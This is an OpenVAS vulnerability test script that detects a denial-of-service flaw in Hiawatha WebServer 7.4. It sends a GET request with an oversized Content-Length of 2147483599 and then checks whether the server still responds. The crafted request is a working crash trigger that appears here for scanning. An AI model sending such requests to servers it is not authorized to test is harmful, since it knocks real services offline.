###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hiawatha_web_srv_content_length_dos.nasl 13 2013-10-27 12:16:33Z jan $
#
# Hiawatha WebServer 'Content-Length' Denial of Service Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow remote unauthenticated attackers to
  cause a denial of service or possibly execute arbitrary code.
  Impact Level: Application";
tag_affected = "Hiawatha Webserver Version 7.4, Other versions may also be affected.";
tag_insight = "The flaw is due to the way Hiawatha web server validates requests
  with a bigger 'Content-Length' causing application crash.";
tag_solution = "No solution or patch is available as of 11th March, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.hiawatha-webserver.org";
tag_summary = "This host is running Hiawatha Web Server and is prone to denial of service
  vulnerability.";

if(description)
{
  script_id(802007);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-03-16 15:16:52 +0100 (Wed, 16 Mar 2011)");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_name("Hiawatha WebServer 'Content-Length' Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution + "


  ";
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/16939/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/99021/DCA-2011-0006.txt");
  script_description(desc);
  script_summary("Check Hiawatha Web Server is vulnerable to DoS");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if(!banner || "Server: Hiawatha" >!< banner){
  exit(0);
}

## Get Host Name or IP
host = get_host_name();
if(!host){
  exit(0);
}

## Construct attack request with bigger Content-Length
attackReq = string( 'GET / HTTP/1.1\r\n',
                    'Host: ' + host + '\r\n',
                    'Content-Length: 2147483599\r\n\r\n' );

## Send crafted Request
res = http_keepalive_send_recv(port:port, data:attackReq);

## Send proper Get request and check the response to
## confirm the Hiawatha Web Server is dead or alive
req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:1);

## If response is null means Hiawatha Web Server is dead
if(!res){
  security_hole(port);
  exit(0);
}
